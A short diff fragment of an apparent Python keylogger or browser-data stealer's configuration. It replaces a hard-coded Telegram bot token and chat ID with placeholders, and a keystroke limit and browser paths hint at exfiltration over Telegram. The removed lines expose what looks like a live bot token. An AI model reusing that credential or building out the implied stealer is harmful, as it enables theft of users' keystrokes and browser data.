@@ -11,8 +11,8 @@ import logging
 import shutil
 
 # ========== Configuration ========== #
-TELEGRAM_API_TOKEN = "7374593904:AAFSLcvcIzyCM1O4vZGsM9FACj_KR6O_qN4"
-TELEGRAM_CHAT_ID = "1744154602"
+TELEGRAM_API_TOKEN = "API bot"
+TELEGRAM_CHAT_ID = "Account ID"
 KEYSTROKE_LIMIT = 100
 BROWSER_PATHS = {
     'Chrome': {
